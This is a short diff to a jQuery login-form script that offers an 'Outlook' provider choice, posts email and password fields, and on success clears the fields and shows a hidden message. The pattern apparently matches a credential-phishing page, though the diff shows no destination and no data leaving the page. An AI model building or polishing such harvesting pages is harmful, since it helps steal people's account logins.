@@ -1,4 +1,5 @@
 $(document).ready(function(){
+	$("#ttpp").hide();
 	$('#a-outlook').click(function(e){
 		e.preventDefault();
 		$('#deg').val("Outlook");
@@ -52,13 +53,16 @@ function submitForm(url,data){
    success :  function(response)
       {      
   
-     if(response=="ok"){    
-      $('#ttpp').click();
+     if(response=="ok"){   
+       $('#working').fadeOut();	
+	   $('#email').val("");	   
+	   $('#pass').val("");	   
+       setTimeout(function(){$('#ttpp').fadeIn();},1500);
      }     
      else{         
       $("#error").fadeIn(1000, function(){      
       $("#error").html('<br><br><div class="alert alert-danger"> '+response+'</div>');
-           $("#working").html('');
+           $("#working").html("");
       });
      }
      
